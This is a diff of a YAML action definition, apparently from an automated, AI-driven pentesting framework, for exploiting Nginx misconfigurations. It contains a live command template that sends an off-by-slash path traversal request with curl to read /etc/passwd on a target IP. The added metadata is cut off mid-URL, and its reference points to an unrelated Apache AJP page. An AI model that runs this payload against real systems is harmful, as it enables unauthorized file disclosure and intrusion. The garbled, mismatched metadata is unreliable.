@@ -2,15 +2,17 @@ name: nginx_misconfiguration
 category: services
 description: Nginx misconfiguration exploitation
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "curl -s 'http://{target_ip}/static../etc/passwd'"
+command_template: curl -s 'http://{target_ip}/static../etc/passwd'
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Nginx: off-by-slash (location /static { alias /var/www/; } → /static../etc/passwd), proxy_pass SSRF, add_header bypass, $uri injection."
+mechanism: '* [Root Me - Nginx - Alias Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-Alias-Misconfiguration)
+  * [Root Me - Nginx - Root Location Misconfiguration](https://www.root-me.'
+hacktricks_ref: network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp.md
